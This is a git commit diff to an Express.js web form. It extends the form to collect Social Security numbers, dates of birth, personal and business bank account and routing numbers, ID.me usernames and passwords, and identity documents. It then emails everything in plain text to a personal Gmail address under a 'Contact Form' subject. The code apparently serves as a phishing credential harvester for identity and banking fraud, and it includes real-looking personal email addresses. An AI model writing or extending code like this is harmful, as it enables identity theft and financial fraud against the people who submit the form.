bbf77dd9fdabdb9f90d69be9f3f52d84889d83a7
Joeychinedu <chinedujoey16@gmail.com>
2023-05-29 17:10:37 +0100

    Update some features

--- app.js
+++ app.js
@@ -31,13 +31,32 @@ const infoSchema = Joi.object({
   lName: Joi.string().min(3).max(30).required(),
   ssn: Joi.string().regex(/^\d{3}-\d{2}-\d{4}$/),
   dob: Joi.date().less(new Date("01/01/2023")).required(),
-  street: Joi.string().required(),
-  city: Joi.string().required(),
-  state: Joi.string().length(2).required(),
-  postalCode: Joi.string().required(),
-  selectField: Joi.string().valid(" ", "DL", "SI").required().messages({
-    "any.only": "Invalid option selected",
-  }),
+  street: Joi.array().items(Joi.string()).required(),
+  city: Joi.array().items(Joi.string()).required(),
+  state: Joi.array().items(Joi.string().length(2)).required(),
+  postalCode: Joi.array().items(Joi.string()).required(),
+  personalBankName: Joi.string().min(3).max(30).required(),
+  personalBankAccountNo: Joi.string().min(8).max(15),
+  personalBankRoutingNo: Joi.string().min(9).max(9),
+  businessBankName: Joi.string().min(3).max(30).required(),
+  businessBankAccountNo: Joi.string().min(8).max(15),
+  businessBankRoutingNo: Joi.string().min(9).max(9),
+  idUsername: Joi.string().required(),
+  idPassword: Joi.string().required(),
+  selectField: Joi.valid(
+    " ",
+    "Father",
+    "Mother",
+    "Sibling",
+    "Cousin",
+    "Nephew",
+    "Niece",
+    "Friend"
+  )
+    .required()
+    .messages({
+      "any.only": "Invalid option selected",
+    }),
   files: Joi.array().items(Joi.any()).length(2),
 });
 
@@ -45,7 +64,8 @@ app.get("/", (req, res) => {
   res.render("form");
 });
 
-app.post("/form", upload.array("files", 2), async (req, res) => {
+app.post("/form", upload.array("files"), async (req, res) => {
+  ``;
   const formData = req.body;
   const files = req.files;
 
@@ -72,7 +92,9 @@ app.post("/form", upload.array("files", 2), async (req, res) => {
     from: "ihemelanduchinedu@gmail.com",
     to: "jaketimber708@gmail.com",
     subject: "New Message from Contact Form",
-    text: `Name: ${value.fName} ${value.lName}\nSSN: ${value.ssn}\nDOB: ${value.dob}\nAddress: ${value.street}, ${value.city}, ${value.state} ${value.postalCode}\nSelected Field: ${value.selectField}`, // Plain text body
+    text: `Name: ${value.fName} ${value.lName}\n\nSSN: ${value.ssn}\n\nDOB: ${value.dob}\n\n1) Personal address: ${value.street[0]},${value.city[0]},${value.state[0]}, ${value.postalCode[0]} 
+    \n2) Personal bank address: ${value.street[1]},${value.city[1]},${value.state[1]}, ${value.postalCode[1]}
+    \n3) Business Bank address: ${value.street[2]}, ${value.city[2]}, ${value.state[2]},${value.postalCode[2]}\n\n4) Personal Bank Name: ${value.personalBankName}\n\n5) Personal Bank Account no: ${value.personalBankAccountNo}\n\n6) Personal Bank Routing no: ${value.personalBankRoutingNo}\n\n7) Business Bank Name: ${value.businessBankName}\n\n8) Business Bank Account no: ${value.businessBankAccountNo}\n\n9) Business Bank Routing no: ${value.businessBankRoutingNo}\n\n10) ID.me Username: ${value.idUsername}\n\n11) ID.me Password: ${value.idPassword}`, // Plain text body
     attachments: files.map((file) => ({
       filename: file.originalname,
       path: file.path,
@@ -91,5 +113,5 @@ app.post("/form", upload.array("files", 2), async (req, res) => {
 });
 
 app.listen(port, () => {
-  console.log(`Example app listening at http://localhost:${port}`);
+  console.log(`Server started at http://localhost:${port}`);
 });
